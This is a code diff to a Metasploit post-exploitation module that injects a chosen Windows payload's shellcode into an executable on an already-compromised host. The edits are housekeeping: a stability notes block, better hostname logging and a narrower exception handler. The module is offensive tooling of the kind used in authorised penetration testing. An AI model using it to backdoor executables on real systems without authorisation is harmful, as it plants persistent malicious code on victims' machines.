@@ -22,6 +22,11 @@ class MetasploitModule < Msf::Post
               peinjector_inject_shellcode
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
         }
       )
     )
@@ -37,12 +42,12 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  # Run Method for when run command is issued
   def run
     session.core.use('peinjector')
 
     # syinfo is only on meterpreter sessions
-    print_status("Running module against #{sysinfo['Computer']}") if !sysinfo.nil?
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
 
     # Check that the payload is a Windows one and on the list
     if !session.framework.payloads.module_refnames.grep(/windows/).include?(datastore['PAYLOAD'])
@@ -103,7 +108,7 @@ class MetasploitModule < Msf::Post
     print_status("Injecting #{pay.name} into the executable #{param[:targetpe]}")
     client.peinjector.inject_shellcode(param)
     print_good("Successfully injected payload into the executable: #{param[:targetpe]}")
-  rescue ::Exception => e
+  rescue StandardError => e
     print_error("Failed to Inject Payload to executable #{param[:targetpe]}!")
     print_error(e.to_s)
   end
